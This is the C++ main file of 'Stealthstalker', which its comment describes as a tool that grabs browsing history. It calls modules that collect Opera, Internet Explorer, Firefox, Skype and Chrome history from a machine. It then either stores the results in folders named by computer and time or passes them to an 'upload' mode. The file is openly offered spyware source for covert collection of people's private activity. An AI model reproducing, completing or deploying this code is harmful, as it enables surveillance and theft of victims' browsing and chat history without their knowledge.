/*
    Stealthstalker project.
    Grabs browsing history

    Author: Kulverstukas
    Started on: 2013.03.11
*/

#include <iostream>
#include <stdio.h>
#include <windows.h>
#include <direct.h>
#include <time.h>
#include <fstream>
#include "OperaHistory.hpp"
#include "IEHistory.hpp"
#include "FFHistory.hpp"
#include "SkypeHistory.hpp"
#include "ChromeHistory.hpp"

using namespace std;

int main(int argc, char** argv) {

    bool upload = false;
    if (argc > 1) {
        upload = !strcmp(argv[1], "upload");
    }

    char compName[MAX_COMPUTERNAME_LENGTH+1];
    DWORD dw = MAX_COMPUTERNAME_LENGTH+1;
    GetComputerName(compName, &dw);

    char currTime[22];
    if (!upload) {
        _mkdir(compName);
        chdir(compName);

        time_t rawTime;
        time(&rawTime);
        struct tm *tmStruct = localtime(&rawTime);
        strftime(currTime, 22, "%Y-%m-%d, %H.%M", tmStruct);
    }

    if (!upload) {
        _mkdir("Opera");
        chdir("Opera");
        _mkdir(currTime);
        chdir(currTime);
    }
    OperaHistory oHistory;
    oHistory.detectOperaVersion(upload, compName);

    if (!upload) {
        chdir("../..");
        _mkdir("InternetExplorer");
        chdir("InternetExplorer");
        _mkdir(currTime);
        chdir(currTime);
    }
    IEHistory ieHistory;
    ieHistory.readFile(upload, compName);

    if (!upload) {
        chdir("../..");
        _mkdir("Firefox");
        chdir("Firefox");
        _mkdir(currTime);
        chdir(currTime);
    }
    FFHistory ffHistory;
    ffHistory.readFile(upload, compName);

    if (!upload) {
        chdir("../..");
        _mkdir("Skype");
        chdir("Skype");
        _mkdir(currTime);
        chdir(currTime);
    }
    SkypeHistory sHistory;
    sHistory.readFile(upload, compName);

    if (!upload) {
//        chdir("../..");
        _mkdir("Chrome");
        chdir("Chrome");
        _mkdir(currTime);
        chdir(currTime);
    }
    ChromeHistory cHistory;
    cHistory.readFile(upload, compName);

    if (!upload) {
        chdir("../../..");
    //    chdir("..");
        ofstream ctrlF("control", ios::app);
        ctrlF.close();
    }

    return 0;
}
